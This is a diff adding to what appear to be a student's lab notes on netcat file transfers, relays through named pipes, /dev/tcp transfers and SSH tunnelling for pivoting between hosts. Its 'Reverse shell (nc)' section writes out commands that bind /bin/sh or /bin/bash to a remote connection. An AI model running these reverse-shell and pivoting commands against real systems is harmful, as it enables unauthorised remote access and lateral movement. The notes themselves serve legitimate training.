@@ -146,8 +146,8 @@ eog <png file>
 sudo nmap -sU <IP> -T4 -p<port> -A
 
 PC1 -- nc -lp <port>
-PC2 -- nc <PC1 IP><port> 0<pipe |nc <PC3 IP><port> |>pipe
-PC3 -- nc -lp <port>
+PC2 -- nc <PC1 IP><port> 0<pipe |nc <PC3 IP><port1> 1>pipe
+PC3 -- nc -lp <port1>
 
 FTP data(20) control(21) PW
 active and passive
@@ -171,6 +171,56 @@ SCP through tunnel
 -download from remote to local dir [scp -P 1111 student@localhost:secretstuff.txt /home/student]
 -upload to a remote from a local dir [scp -P 1111 secretstuff.txt student@localhost:/home/student]
 
-Netcat 
+Netcat (CLIENT TO LISTENER FILE TRANSFER)
 Client (sends file): nc 10.2.0.2 9001 < file.txt
 Listener (receive file): nc -l -p 9001 > newfile.txt
+
+Netcat (LISTENER TO CLIENT FILE TRANSFER)
+Listener (sends file): nc -l -p 9001 < file.txt
+Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+
+Netcat Relay
+On Client -
+mknod mypipe p
+nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+On Listener2 (sends) - nc -l -p 9002 < infile.txt
+On Listener1 (receives) - nc -l -p 9001 > outfile.txt
+writes out to both through named pipe
+
+File transfer /dev/tcp (host w/out nc)
+on receiving - nc -l -p 1111 > file.txt
+on sending - cat file.txt > /dev/tcp/10.2.0.2/1111
+
+Reverse shell (nc)
+shelled into remote host - nc -c /bin/sh <ip> <unfiltered port>
+piping bash - /bin/sh | nc <ip> <unfiltered port>
+listen for shell - nc -l -p <same unfiltered port> -vvv
+using -e - nc -l -p <unfiltered port> -e /bin/bash
+
+ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
+ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+
+create local port 1111 on local host, forwards to target host port 80[ssh student@172.16.82.106 -L 1111:localhost:80 -NT]
+
+
+PC1> ssh user@S1 -L 1111:S2:22 -NT      
+
+PC1> nc 127.0.0.1 <local port>
+
+PC1> wget -r 127.0.0.1:<local port>                                       
+
+PC1> ssh user@S1 -L 1112:S2:23 -NT (on S2 through telnet port 23)
+
+PC1> telnet 127.0.0.1 1112
+
+S2> ssh user@S1 -R 1200:127.0.0.1:22 -NT 
+
+PC1> ssh user@S1
+
+S1> nc 127.0.0.1 1200
+
+PC1> ssh user@S1 -L 1113:127.0.0.1:1200 -NT
+
+PC1 -------NO!------S1(22)----------S2(22,23,80)---------NO!-----------PC2
+1112-S2:23         1200-S2:22
+1113-S1:1200
